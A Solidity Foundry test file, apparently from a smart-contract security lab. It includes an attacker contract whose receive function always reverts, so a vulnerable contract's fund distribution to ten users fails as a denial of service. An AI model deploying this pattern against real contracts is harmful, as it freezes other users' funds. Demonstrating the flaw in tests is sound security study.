// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/VulnerableDosCallContract.sol";

contract AttackContract {
    VulnerableDosCallContract public target;

    constructor(address _target) {
        target = VulnerableDosCallContract(_target);
    }

    //Force Revert when receiving Ether.
    receive() external payable {
        revert("Blocking Ether Transfers!");
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
    }
}

contract DoSWithFailedCallTest is Test {
    VulnerableDosCallContract public vulnerable;
    AttackContract public attacker;
    address public attackerAddress = address(0x123);
    address[10] public users;

    function setUp() public {
        vulnerable = new VulnerableDosCallContract();
        vm.deal(attackerAddress, 5 ether);
        vm.startPrank(attackerAddress);
        attacker = new AttackContract(address(vulnerable));
        vm.stopPrank();

        // Load 10 recipients
        for (uint256 i = 0; i < 10; i++) {
            users[i] = address(uint160(i + 1));
            vm.deal(users[i], 1 ether);
            vm.prank(users[i]);
            vulnerable.deposit{value: 0.5 ether}();
        }
    }

    function testDoSAttack() public {
        vm.startPrank(attackerAddress);
        attacker.attack{value: 1 ether}();
        vm.stopPrank();

        console.log("Starting fund distribution...");

        vm.expectRevert();
        vm.prank(attackerAddress);
        vulnerable.distributeFunds();

        console.log("Fund distribution interrupted due to DoS attack!");

        // for (uint256 i = 0; i < users.length; i++) {
        //     console.log("User Balances", address(users[i]).balance);
        // }
    }
}
